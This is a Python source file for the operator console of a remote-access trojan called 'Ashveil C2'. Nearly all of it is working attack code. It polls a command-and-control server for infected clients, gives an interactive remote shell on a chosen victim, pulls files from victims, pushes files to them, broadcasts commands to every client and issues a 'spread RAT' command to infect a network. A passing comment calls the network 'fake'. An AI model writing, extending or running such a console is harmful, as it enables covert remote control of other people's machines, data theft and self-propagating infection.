import requests
import time
import argparse
from blessed import Terminal

term = Terminal()
C2_SERVER = "http://" + input("server ip + port: ")

menu_items = [
    "Run shell command",
    "Upload file from client",
    "Download file to client",
    "Spread to network",
    "Broadcast command to all clients",
    "Exit"
]

def interactive_shell(client):
    print(f"\n💀 Ashveil Shell (CLI Mode) — type 'exit' to quit. Connected to {client}.\n")
    while True:
        cmd = input(" > ")
        if cmd.lower() == "exit":
            break
        try:
            requests.post(f"{C2_SERVER}/set", data=cmd)
            time.sleep(2)
            result = requests.get(f"{C2_SERVER}/last").text
            print(result.strip())
        except Exception as e:
            print("[-] Error:", e)

def select_client():
    try:
        response = requests.get(f"{C2_SERVER}/clients")
        clients = response.json().get('clients', [])
        if not clients:
            print("No clients connected!")
            return None

        print("Select client to control:")
        for idx, client in enumerate(clients, 1):
            print(f"{idx}. {client}")
        choice = int(input("Choice: "))
        return clients[choice - 1]
    except Exception as e:
        print("[-] Failed to get clients:", e)
        return None

def broadcast_command():
    cmd = input("Command to broadcast to all clients: ").strip()
    try:
        requests.post(f"{C2_SERVER}/broadcast", data=cmd)
        print(f"[*] Broadcast command sent: {cmd}")
    except Exception as e:
        print("[-] Broadcast failed:", e)

def spread_rats(client):
    print("[*] Spreading RAT to all devices in fake network...")
    requests.post(f"{C2_SERVER}/spread")
    print("[*] Spread command sent.")

def upload_file(client):
    path = input("Path to file on client to upload: ").strip()
    try:
        requests.post(f"{C2_SERVER}/set", data=f"upload {path}")
        print("[*] Upload command sent.")
    except Exception as e:
        print("[-] Failed:", e)

def download_file(client):
    filename = input("Filename to send to client: ").strip()
    try:
        requests.post(f"{C2_SERVER}/set", data=f"download {filename}")
        print("[*] Download command sent.")
    except Exception as e:
        print("[-] Failed:", e)

def show_menu():
    selected = 0
    with term.fullscreen(), term.cbreak(), term.hidden_cursor():
        while True:
            print(term.clear + term.move_yx(0, 0))
            print(term.bold_underline("=== Ashveil C2 Menu ===\n"))
            for i, item in enumerate(menu_items):
                if i == selected:
                    print(term.underline + item + term.normal)
                else:
                    print(item)

            key = term.inkey()
            if key.name == "KEY_UP" and selected > 0:
                selected -= 1
            elif key.name == "KEY_DOWN" and selected < len(menu_items) - 1:
                selected += 1
            elif key.name == "KEY_ENTER" or key == "\n":
                if menu_items[selected] == "Exit":
                    break
                client = select_client()
                if not client:
                    continue
                if menu_items[selected] == "Run shell command":
                    interactive_shell(client)
                elif menu_items[selected] == "Upload file from client":
                    upload_file(client)
                elif menu_items[selected] == "Download file to client":
                    download_file(client)
                elif menu_items[selected] == "Spread to network":
                    spread_rats(client)
                elif menu_items[selected] == "Broadcast command to all clients":
                    broadcast_command()

def main():
    parser = argparse.ArgumentParser(description="Ashveil Attacker Interface")
    parser.add_argument("--cli", action="store_true", help="Launch interactive shell mode")
    args = parser.parse_args()

    if args.cli:
        client = select_client()
        if client:
            interactive_shell(client)
    else:
        show_menu()

if __name__ == "__main__":
    main()
